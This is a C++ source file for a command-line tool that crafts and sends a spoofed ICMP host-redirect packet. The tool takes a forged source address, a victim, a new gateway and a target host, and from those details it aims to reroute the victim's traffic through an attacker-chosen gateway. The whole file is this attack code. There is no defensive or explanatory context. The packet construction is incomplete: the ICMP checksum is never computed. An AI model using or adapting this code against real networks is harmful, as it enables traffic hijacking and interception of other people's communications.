// ============================================================
// icmp_redirect.cpp — send ICMP redirect to alter routing
// ------------------------------------------------------------
// Compile: clang++ -std=c++17 -O2 -o icmp_redirect icmp_redirect.cpp
// Usage:   sudo ./icmp_redirect <src> <dst> <new_gw> <target>
// ============================================================
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

int main(int argc, char** argv) {
    if (argc < 5) return 1;
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(s, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in dst{};
    dst.sin_family = AF_INET;
    inet_pton(AF_INET, argv[2], &dst.sin_addr);

    char buf[4096] = {0};
    auto* ip = (iphdr*)buf;
    auto* icmp = (icmphdr*)(buf + sizeof(iphdr));

    ip->version = 4; ip->ihl = 5; ip->tot_len = htons(56);
    ip->ttl = 64; ip->protocol = IPPROTO_ICMP;
    inet_pton(AF_INET, argv[1], &ip->saddr);
    ip->daddr = dst.sin_addr.s_addr;

    icmp->type = ICMP_REDIRECT;
    icmp->code = ICMP_REDIRECT_HOST;
    inet_pton(AF_INET, argv[3], &icmp->un.gateway);

    // Embed original IP header + 8 bytes (target)
    auto* orig = (iphdr*)(buf + sizeof(iphdr) + sizeof(icmphdr));
    orig->version = 4; orig->ihl = 5; orig->protocol = IPPROTO_TCP;
    inet_pton(AF_INET, argv[4], &orig->daddr);

    sendto(s, buf, 56, 0, (sockaddr*)&dst, sizeof(dst));
    std::printf("[+] ICMP redirect sent\n");
    return 0;
}
